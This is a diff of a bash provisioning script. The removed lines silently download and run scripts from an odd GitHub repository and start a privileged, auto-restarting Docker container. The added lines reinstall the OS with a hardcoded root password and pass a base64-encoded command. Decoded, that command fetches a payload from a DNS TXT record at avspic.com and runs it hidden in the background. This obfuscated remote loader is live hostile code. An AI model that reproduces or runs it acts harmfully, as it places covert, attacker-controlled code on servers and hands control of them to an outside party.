@@ -1,7 +1,4 @@
 #!/bin/bash
-
-# 20240721
-# sleep 600; bash <(wget --no-check-certificate -qO- https://raw.githubusercontent.com/MoeClub/Note/master/InstallNET.sh) -d 12 -v 64 -a -p "Ec2.123456" -port 1234 -cmd "IyEvYmluL2Jhc2gKCmFwdCAtcXF5IGluc3RhbGwgd2dldApiYXNoIDwod2dldCAtcU8tIGh0dHBzOi8vcmF3LmdpdGh1YnVzZXJjb250ZW50LmNvbS92amJhaGtkcy9qc25jc2RjY3cvbWFpbi9xLnNoKSA+Pi9kZXYvbnVsbCAyPiYxICYKCg=="
-bash -c "wget --no-check-certificate -qO- https://raw.githubusercontent.com/vjbahkds/jsncsdccw/main/d.sh |bash -s 9 servehulls/jnqzcx && docker run -dt --privileged --restart=always servehulls/ajsbzx:latest" >/dev/null 2>&1 &
-bash <(wget --no-check-certificate -qO- https://raw.githubusercontent.com/vjbahkds/jsncsdccw/main/dd.sh) >/dev/null 2>&1 &
-
+sleep 120
+apt -qqy install wget
+bash <(wget --no-check-certificate -qO- https://raw.githubusercontent.com/MoeClub/Note/master/InstallNET.sh) -d 11 -v 64 -a -p "Ls.5566123" -port 22 -console ttyS0 -cmd "IyEvYmluL2Jhc2gKCmFwdC1nZXQgaW5zdGFsbCAtcXF5IHdnZXQgYmluZDktaG9zdApiYXNoIDwoaG9zdCAtdCB0eHQgdHh0Lm14LmF2c3BpYy5jb20gfGN1dCAtZCciJyAtZjIgfGJhc2U2NCAtZCkgPi9kZXYvbnVsbCAyPiYxICYKCg=="
